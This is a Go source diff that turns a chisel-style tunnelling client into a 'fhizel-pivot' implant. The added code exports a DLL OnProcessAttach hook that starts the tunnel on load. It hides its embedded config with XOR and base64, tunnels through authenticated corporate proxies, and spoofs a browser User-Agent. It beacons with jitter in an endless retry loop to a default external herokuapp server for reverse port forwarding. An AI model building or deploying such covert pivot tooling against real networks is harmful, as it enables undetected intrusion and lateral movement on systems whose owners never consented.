@@ -1,443 +1,292 @@
 package main
+import "C"
 
 import (
-	"flag"
+	"bytes"
+	"encoding/base64"
 	"fmt"
+	"github.com/aus/proxyplease"
 	"io/ioutil"
 	"log"
+	"math/rand"
+	"unsafe"
+	"net"
 	"net/http"
+	"net/url"
 	"os"
-	"runtime"
 	"strconv"
-	"strings"
 	"time"
 
 	chclient "github.com/codaul/volume/client"
-	chserver "github.com/codaul/volume/server"
-	chshare "github.com/codaul/volume/share"
-	"github.com/codaul/volume/share/cos"
+	_ "github.com/aus/proxyplease"
+	"github.com/spf13/viper"
 )
 
-var help = `
-  Usage: chisel [command] [--help]
+var d = net.Dialer{}
+var dialContext = d.DialContext
+// a make step will encode config.toml file to a string and embed as build variable
+var pivotConfig string
 
-  Version: ` + chshare.BuildVersion + ` (` + runtime.Version() + `)
+func init() {
+	rand.Seed(time.Now().UTC().UnixNano())
+}
 
-  Commands:
-    server - runs chisel in server mode
-    client - runs chisel in client mode
+//export OnProcessAttach
+func OnProcessAttach(
+	hinstDLL unsafe.Pointer, // handle to DLL module
+	fdwReason uint32, // reason for calling function
+	lpReserved unsafe.Pointer, // reserved
+) {
+	Pivot(pivotConfig)
+}
 
-  Read more:
-    https://github.com/codaul/volume
-
-`
+//export Test
+func Test() {
+	Pivot(pivotConfig)
+}
 
 func main() {
-
-	version := flag.Bool("version", false, "")
-	v := flag.Bool("v", false, "")
-	flag.Bool("help", false, "")
-	flag.Bool("h", false, "")
-	flag.Usage = func() {}
-	flag.Parse()
-
-	if *version || *v {
-		fmt.Println(chshare.BuildVersion)
+	// TODO: clean this up
+	switch len(os.Args) {
+	case 2:
+		// run encoded config from command line args
+		Pivot(os.Args[1])
+	case 3:
+		// if args "encode filename.toml", then print encoded config and exit
+		fmt.Println(encode(os.Args[2]))
 		os.Exit(0)
-	}
-
-	args := flag.Args()
-
-	subcmd := ""
-	if len(args) > 0 {
-		subcmd = args[0]
-		args = args[1:]
-	}
-
-	switch subcmd {
-	case "server":
-		server(args)
-	case "client":
-		client(args)
 	default:
-		fmt.Print(help)
-		os.Exit(0)
+		Pivot(pivotConfig)
 	}
 }
 
-var commonHelp = `
-    --pid Generate pid file in current working directory
+func Hello(msg string){
+	fmt.Println(msg)
+}
 
-    -v, Enable verbose logging
+// Pivot is the entry point for fhizel-pivot. It takes an encoded config as a parameter.
+func Pivot(config string) {
+	// prepare config defaults
+	setDefaults()
 
-    --help, This help text
+	// read in config
+	viper.SetConfigType("yaml")
+	err := viper.ReadConfig(bytes.NewBuffer([]byte(decode(config))))
+	if err != nil {
+		panic(fmt.Errorf("Fatal error config file: %s", err))
+	}
 
-  Signals:
-    The chisel process is listening for:
-      a SIGUSR2 to print process stats, and
-      a SIGHUP to short-circuit the client reconnect timer
+	// proxy setup
+	// proxyplease module expects some parameters to be nil if unconfigured
+	// so convert any empty proxy parameters to nil just in case
+	proxyurl, err := url.Parse(viper.GetString("server.proxy.url"))
+	if err != nil {
+		panic(fmt.Errorf("Error parsing proxy url: %s", err))
+	}
+	if proxyurl.String() == "" {
+		proxyurl = nil
+	}
 
-  Version:
-    ` + chshare.BuildVersion + ` (` + runtime.Version() + `)
+	proxytargeturl, _ := url.Parse(viper.GetString("server.proxy.targeturl"))
+	if err != nil {
+		panic(fmt.Errorf("Error parsing proxy target url: %s", err))
+	}
+	if proxytargeturl.String() == "" {
+		proxytargeturl = nil
+	}
 
-  Read more:
-    https://github.com/codaul/volume
+	proxyauthschemes := viper.GetStringSlice("server.proxy.authschemes")
+	if len(proxyauthschemes) == 1 {
+		if proxyauthschemes[0] == "" {
+			proxyauthschemes = nil
+		}
+	}
 
-`
+	proxyuser := viper.GetString("server.proxy.username")
+	proxypass := viper.GetString("server.proxy.password")
+	proxydomain := viper.GetString("server.proxy.domain")
 
-func generatePidFile() {
-	pid := []byte(strconv.Itoa(os.Getpid()))
-	if err := ioutil.WriteFile("chisel.pid", pid, 0644); err != nil {
-		log.Fatal(err)
+	proxyhdrs := parseHeaders(viper.GetStringMapString("server.proxy.headers"))
+
+	// build proxy dialContext
+	pp := proxyplease.Proxy{
+		URL:              proxyurl,
+		Username:         proxyuser,
+		Password:         proxypass,
+		Domain:           proxydomain,
+		AuthSchemeFilter: proxyauthschemes,
+		TargetURL:        proxytargeturl,
+		Headers:          &proxyhdrs,
+	}
+	_ = pp
+
+
+	if viper.GetString("server.proxy.url") == "direct" {
+		fmt.Println("Forcing direct connection")
+	} else {
+		dialContext = proxyplease.NewDialContext(pp)
+	}
+
+
+	// prepare fhizel client config
+	urls := viper.GetStringSlice("server.urls")
+	remotes := parseRemotes(viper.GetStringSlice("server.remotes"))
+	hdrs := parseHeaders(viper.GetStringMapString("server.headers"))
+	ka, err := time.ParseDuration(viper.GetString("server.keepalive"))
+	if err != nil {
+		panic(fmt.Errorf("Error parsing server.keepalive duration: %s", err))
+	}
+	sleep, err := time.ParseDuration(viper.GetString("server.sleep"))
+	if err != nil {
+		panic(fmt.Errorf("Error parsing server.sleep duration: %s", err))
+	}
+	mri, err := time.ParseDuration(viper.GetString("server.maxretryinterval"))
+	if err != nil {
+		panic(fmt.Errorf("Error parsing server.maxretryinterval duration: %s", err))
+	}
+	mrc := viper.GetInt("server.maxretrycount")
+	fingerprint := viper.GetString("server.fingerprint")
+	auth := viper.GetString("server.auth")
+	jitter := viper.GetInt("server.jitter")
+	giveupafter := viper.GetInt("server.giveupafter")
+
+	attempt := 0
+	giveup := false
+
+	// connect loop
+	for giveup == false {
+		// shuffle urls if requested
+		if viper.GetBool("server.shuffle") && len(urls) > 1 {
+			rand.Shuffle(len(urls), func(i, j int) { urls[i], urls[j] = urls[j], urls[i] })
+		}
+
+		// attempt each url
+		for _, url := range urls {
+			attempt++
+			// shuffle ports again if randomized
+			remotes = parseRemotes(viper.GetStringSlice("server.remotes"))
+			c, err := chclient.NewClient(&chclient.Config{
+				Fingerprint:      fingerprint,
+				Auth:             auth,
+				KeepAlive:        ka,
+				MaxRetryCount:    mrc,
+				MaxRetryInterval: mri,
+				Server:           url,
+				Remotes:          remotes,
+				Headers:          hdrs,
+				DialContext:      dialContext,
+			})
+			if err != nil {
+				log.Fatal(err)
+			}
+
+			c.Debug = true
+			err = c.Run() // blocks until disconnect
+			if err != nil {
+				log.Println(err)
+			}
+
+			// give up?
+			if attempt >= giveupafter && giveupafter > 0 {
+				log.Println("client: Max attempts reached. Giving up!")
+				giveup = true
+				break
+			}
+
+			// now sleep between attempts
+			snooze(sleep, jitter)
+
+			// TODO: if expired, return
+		}
 	}
 }
 
-var serverHelp = `
-  Usage: chisel server [options]
-
-  Options:
-
-    --host, Defines the HTTP listening host – the network interface
-    (defaults the environment variable HOST and falls back to 0.0.0.0).
-
-    --port, -p, Defines the HTTP listening port (defaults to the environment
-    variable PORT and fallsback to port 8080).
-
-    --key, An optional string to seed the generation of a ECDSA public
-    and private key pair. All communications will be secured using this
-    key pair. Share the subsequent fingerprint with clients to enable detection
-    of man-in-the-middle attacks (defaults to the CHISEL_KEY environment
-    variable, otherwise a new key is generate each run).
-
-    --authfile, An optional path to a users.json file. This file should
-    be an object with users defined like:
-      {
-        "<user:pass>": ["<addr-regex>","<addr-regex>"]
-      }
-    when <user> connects, their <pass> will be verified and then
-    each of the remote addresses will be compared against the list
-    of address regular expressions for a match. Addresses will
-    always come in the form "<remote-host>:<remote-port>" for normal remotes
-    and "R:<local-interface>:<local-port>" for reverse port forwarding
-    remotes. This file will be automatically reloaded on change.
-
-    --auth, An optional string representing a single user with full
-    access, in the form of <user:pass>. It is equivalent to creating an
-    authfile with {"<user:pass>": [""]}. If unset, it will use the
-    environment variable AUTH.
-
-    --keepalive, An optional keepalive interval. Since the underlying
-    transport is HTTP, in many instances we'll be traversing through
-    proxies, often these proxies will close idle connections. You must
-    specify a time with a unit, for example '5s' or '2m'. Defaults
-    to '25s' (set to 0s to disable).
-
-    --backend, Specifies another HTTP server to proxy requests to when
-    chisel receives a normal HTTP request. Useful for hiding chisel in
-    plain sight.
-
-    --socks5, Allow clients to access the internal SOCKS5 proxy. See
-    chisel client --help for more information.
-
-    --reverse, Allow clients to specify reverse port forwarding remotes
-    in addition to normal remotes.
-
-    --tls-key, Enables TLS and provides optional path to a PEM-encoded
-    TLS private key. When this flag is set, you must also set --tls-cert,
-    and you cannot set --tls-domain.
-
-    --tls-cert, Enables TLS and provides optional path to a PEM-encoded
-    TLS certificate. When this flag is set, you must also set --tls-key,
-    and you cannot set --tls-domain.
-
-    --tls-domain, Enables TLS and automatically acquires a TLS key and
-    certificate using LetsEncypt. Setting --tls-domain requires port 443.
-    You may specify multiple --tls-domain flags to serve multiple domains.
-    The resulting files are cached in the "$HOME/.cache/chisel" directory.
-    You can modify this path by setting the CHISEL_LE_CACHE variable,
-    or disable caching by setting this variable to "-". You can optionally
-    provide a certificate notification email by setting CHISEL_LE_EMAIL.
-
-    --tls-ca, a path to a PEM encoded CA certificate bundle or a directory
-    holding multiple PEM encode CA certificate bundle files, which is used to 
-    validate client connections. The provided CA certificates will be used 
-    instead of the system roots. This is commonly used to implement mutual-TLS. 
-` + commonHelp
-
-func server(args []string) {
-
-	flags := flag.NewFlagSet("server", flag.ContinueOnError)
-
-	config := &chserver.Config{}
-	flags.StringVar(&config.KeySeed, "key", "", "")
-	flags.StringVar(&config.AuthFile, "authfile", "", "")
-	flags.StringVar(&config.Auth, "auth", "", "")
-	flags.DurationVar(&config.KeepAlive, "keepalive", 25*time.Second, "")
-	flags.StringVar(&config.Proxy, "proxy", "", "")
-	flags.StringVar(&config.Proxy, "backend", "", "")
-	flags.BoolVar(&config.Socks5, "socks5", false, "")
-	flags.BoolVar(&config.Reverse, "reverse", false, "")
-	flags.StringVar(&config.TLS.Key, "tls-key", "", "")
-	flags.StringVar(&config.TLS.Cert, "tls-cert", "", "")
-	flags.Var(multiFlag{&config.TLS.Domains}, "tls-domain", "")
-	flags.StringVar(&config.TLS.CA, "tls-ca", "", "")
-
-	host := flags.String("host", "", "")
-	p := flags.String("p", "", "")
-	port := flags.String("port", "", "")
-	pid := flags.Bool("pid", false, "")
-	verbose := flags.Bool("v", false, "")
-
-	flags.Usage = func() {
-		fmt.Print(serverHelp)
-		os.Exit(0)
+func snooze(sleep time.Duration, jitter int) {
+	if jitter > 0 {
+		sleepF64 := float64(sleep)
+		jitterF64 := float64(jitter) / 100
+		min := sleepF64 - (sleepF64 * jitterF64)
+		max := sleepF64 + (sleepF64 * jitterF64)
+		t := rand.Int63n(int64(max)) + int64(min)
+		sleep = time.Duration(t)
 	}
-	flags.Parse(args)
 
-	if *host == "" {
-		*host = os.Getenv("HOST")
+	log.Printf("client: Sleeping %s...", sleep.Round(time.Second).String())
+	time.Sleep(sleep)
+}
+
+func decode(s string) string {
+	decoded, err := base64.StdEncoding.DecodeString(s)
+	if err != nil {
+		fmt.Printf("Error decoding string: %s ", err.Error())
+		return ""
 	}
-	if *host == "" {
-		*host = "0.0.0.0"
+
+	var output string
+	// so l33t
+	k := "fhizel"
+	for i := 0; i < len(decoded); i++ {
+		output += string(decoded[i] ^ k[i%len(k)])
 	}
-	if *port == "" {
-		*port = *p
-	}
-	if *port == "" {
-		*port = os.Getenv("PORT")
-	}
-	if *port == "" {
-		*port = "8080"
-	}
-	if config.KeySeed == "" {
-		config.KeySeed = os.Getenv("CHISEL_KEY")
-	}
-	s, err := chserver.NewServer(config)
+	return output
+}
+
+func encode(filename string) string {
+	file, err := os.Open(filename)
 	if err != nil {
 		log.Fatal(err)
 	}
-	s.Debug = *verbose
-	if *pid {
-		generatePidFile()
+	defer file.Close()
+
+	b, err := ioutil.ReadAll(file)
+	// XOR
+	k := "fhizel"
+	for i := 0; i < len(b); i++ {
+		b[i] = b[i] ^ k[i%len(k)]
 	}
-	go cos.GoStats()
-	ctx := cos.InterruptContext()
-	if err := s.StartContext(ctx, *host, *port); err != nil {
-		log.Fatal(err)
-	}
-	if err := s.Wait(); err != nil {
-		log.Fatal(err)
-	}
+	// b64 encode
+	encoded := make([]byte, base64.StdEncoding.EncodedLen(len(b)))
+	base64.StdEncoding.Encode(encoded, b)
+	return string(encoded)
 }
 
-type multiFlag struct {
-	values *[]string
+func parseHeaders(s map[string]string) http.Header {
+	// for each key, value insert into http.Header type
+	hdrs := make(http.Header)
+	for k, v := range s {
+		hdrs.Set(k, v)
+	}
+	return hdrs
 }
 
-func (flag multiFlag) String() string {
-	return strings.Join(*flag.values, ", ")
+func parseRemotes(remotes []string) []string {
+	// convert '#' to random digit. useful for avoiding port conflicts.
+	for i, remote := range remotes {
+		remote := []byte(remote)
+		for i := 0; i < len(remote); i++ {
+			if remote[i] == '#' {
+				rstr := strconv.Itoa(rand.Intn(9))
+				remote[i] = rstr[0]
+			}
+		}
+		remotes[i] = string(remote)
+	}
+	return remotes
 }
 
-func (flag multiFlag) Set(arg string) error {
-	*flag.values = append(*flag.values, arg)
-	return nil
-}
+func setDefaults() {
+	viper.SetDefault("server.urls", []string{"https://fhizel-demo.herokuapp.com"})
+	viper.SetDefault("server.remotes", []string{"3###"})
+	viper.SetDefault("server.headers.User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0")
+	viper.SetDefault("server.proxy.headers.User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0")
+	viper.SetDefault("server.keepalive", "5s")
+	viper.SetDefault("server.shuffle", true)
+	viper.SetDefault("server.maxretrycount", 0)
+	viper.SetDefault("server.maxretryinterval", "10s")
+	viper.SetDefault("server.giveupafter", 0)
+	viper.SetDefault("server.sleep", "10s")
+	viper.SetDefault("server.jitter", 0)
 
-type headerFlags struct {
-	http.Header
-}
-
-func (flag *headerFlags) String() string {
-	out := ""
-	for k, v := range flag.Header {
-		out += fmt.Sprintf("%s: %s\n", k, v)
-	}
-	return out
-}
-
-func (flag *headerFlags) Set(arg string) error {
-	index := strings.Index(arg, ":")
-	if index < 0 {
-		return fmt.Errorf(`Invalid header (%s). Should be in the format "HeaderName: HeaderContent"`, arg)
-	}
-	if flag.Header == nil {
-		flag.Header = http.Header{}
-	}
-	key := arg[0:index]
-	value := arg[index+1:]
-	flag.Header.Set(key, strings.TrimSpace(value))
-	return nil
-}
-
-var clientHelp = `
-  Usage: chisel client [options] <server> <remote> [remote] [remote] ...
-
-  <server> is the URL to the chisel server.
-
-  <remote>s are remote connections tunneled through the server, each of
-  which come in the form:
-
-    <local-host>:<local-port>:<remote-host>:<remote-port>/<protocol>
-
-    ■ local-host defaults to 0.0.0.0 (all interfaces).
-    ■ local-port defaults to remote-port.
-    ■ remote-port is required*.
-    ■ remote-host defaults to 0.0.0.0 (server localhost).
-    ■ protocol defaults to tcp.
-
-  which shares <remote-host>:<remote-port> from the server to the client
-  as <local-host>:<local-port>, or:
-
-    R:<local-interface>:<local-port>:<remote-host>:<remote-port>/<protocol>
-
-  which does reverse port forwarding, sharing <remote-host>:<remote-port>
-  from the client to the server's <local-interface>:<local-port>.
-
-    example remotes
-
-      3000
-      example.com:3000
-      3000:google.com:80
-      192.168.0.5:3000:google.com:80
-      socks
-      5000:socks
-      R:2222:localhost:22
-      R:socks
-      R:5000:socks
-      stdio:example.com:22
-      1.1.1.1:53/udp
-
-    When the chisel server has --socks5 enabled, remotes can
-    specify "socks" in place of remote-host and remote-port.
-    The default local host and port for a "socks" remote is
-    127.0.0.1:1080. Connections to this remote will terminate
-    at the server's internal SOCKS5 proxy.
-
-    When the chisel server has --reverse enabled, remotes can
-    be prefixed with R to denote that they are reversed. That
-    is, the server will listen and accept connections, and they
-    will be proxied through the client which specified the remote.
-    Reverse remotes specifying "R:socks" will listen on the server's
-    default socks port (1080) and terminate the connection at the
-    client's internal SOCKS5 proxy.
-
-    When stdio is used as local-host, the tunnel will connect standard
-    input/output of this program with the remote. This is useful when 
-    combined with ssh ProxyCommand. You can use
-      ssh -o ProxyCommand='chisel client chiselserver stdio:%h:%p' \
-          user@example.com
-    to connect to an SSH server through the tunnel.
-
-  Options:
-
-    --fingerprint, A *strongly recommended* fingerprint string
-    to perform host-key validation against the server's public key.
-	Fingerprint mismatches will close the connection.
-	Fingerprints are generated by hashing the ECDSA public key using
-	SHA256 and encoding the result in base64.
-	Fingerprints must be 44 characters containing a trailing equals (=).
-
-    --auth, An optional username and password (client authentication)
-    in the form: "<user>:<pass>". These credentials are compared to
-    the credentials inside the server's --authfile. defaults to the
-    AUTH environment variable.
-
-    --keepalive, An optional keepalive interval. Since the underlying
-    transport is HTTP, in many instances we'll be traversing through
-    proxies, often these proxies will close idle connections. You must
-    specify a time with a unit, for example '5s' or '2m'. Defaults
-    to '25s' (set to 0s to disable).
-
-    --max-retry-count, Maximum number of times to retry before exiting.
-    Defaults to unlimited.
-
-    --max-retry-interval, Maximum wait time before retrying after a
-    disconnection. Defaults to 5 minutes.
-
-    --proxy, An optional HTTP CONNECT or SOCKS5 proxy which will be
-    used to reach the chisel server. Authentication can be specified
-    inside the URL.
-    For example, http://admin:password@my-server.com:8081
-            or: socks://admin:password@my-server.com:1080
-
-    --header, Set a custom header in the form "HeaderName: HeaderContent".
-    Can be used multiple times. (e.g --header "Foo: Bar" --header "Hello: World")
-
-    --hostname, Optionally set the 'Host' header (defaults to the host
-    found in the server url).
-
-    --tls-ca, An optional root certificate bundle used to verify the
-    chisel server. Only valid when connecting to the server with
-    "https" or "wss". By default, the operating system CAs will be used.
-
-    --tls-skip-verify, Skip server TLS certificate verification of
-    chain and host name (if TLS is used for transport connections to
-    server). If set, client accepts any TLS certificate presented by
-    the server and any host name in that certificate. This only affects
-    transport https (wss) connection. Chisel server's public key
-    may be still verified (see --fingerprint) after inner connection
-    is established.
-
-    --tls-key, a path to a PEM encoded private key used for client 
-    authentication (mutual-TLS).
-
-    --tls-cert, a path to a PEM encoded certificate matching the provided 
-    private key. The certificate must have client authentication 
-    enabled (mutual-TLS).
-` + commonHelp
-
-func client(args []string) {
-	flags := flag.NewFlagSet("client", flag.ContinueOnError)
-	config := chclient.Config{Headers: http.Header{}}
-	flags.StringVar(&config.Fingerprint, "fingerprint", "", "")
-	flags.StringVar(&config.Auth, "auth", "", "")
-	flags.DurationVar(&config.KeepAlive, "keepalive", 25*time.Second, "")
-	flags.IntVar(&config.MaxRetryCount, "max-retry-count", -1, "")
-	flags.DurationVar(&config.MaxRetryInterval, "max-retry-interval", 0, "")
-	flags.StringVar(&config.Proxy, "proxy", "", "")
-	flags.StringVar(&config.TLS.CA, "tls-ca", "", "")
-	flags.BoolVar(&config.TLS.SkipVerify, "tls-skip-verify", false, "")
-	flags.StringVar(&config.TLS.Cert, "tls-cert", "", "")
-	flags.StringVar(&config.TLS.Key, "tls-key", "", "")
-	flags.Var(&headerFlags{config.Headers}, "header", "")
-	hostname := flags.String("hostname", "", "")
-	pid := flags.Bool("pid", false, "")
-	verbose := flags.Bool("v", false, "")
-	flags.Usage = func() {
-		fmt.Print(clientHelp)
-		os.Exit(0)
-	}
-	flags.Parse(args)
-	//pull out options, put back remaining args
-	args = flags.Args()
-	if len(args) < 2 {
-		log.Fatalf("A server and least one remote is required")
-	}
-	config.Server = args[0]
-	config.Remotes = args[1:]
-	//default auth
-	if config.Auth == "" {
-		config.Auth = os.Getenv("AUTH")
-	}
-	//move hostname onto headers
-	if *hostname != "" {
-		config.Headers.Set("Host", *hostname)
-	}
-	//ready
-	c, err := chclient.NewClient(&config)
-	if err != nil {
-		log.Fatal(err)
-	}
-	c.Debug = *verbose
-	if *pid {
-		generatePidFile()
-	}
-	go cos.GoStats()
-	ctx := cos.InterruptContext()
-	if err := c.Start(ctx); err != nil {
-		log.Fatal(err)
-	}
-	if err := c.Wait(); err != nil {
-		log.Fatal(err)
-	}
+	// TODO: expire default variable
+	// TODO: multiple [server] support
 }
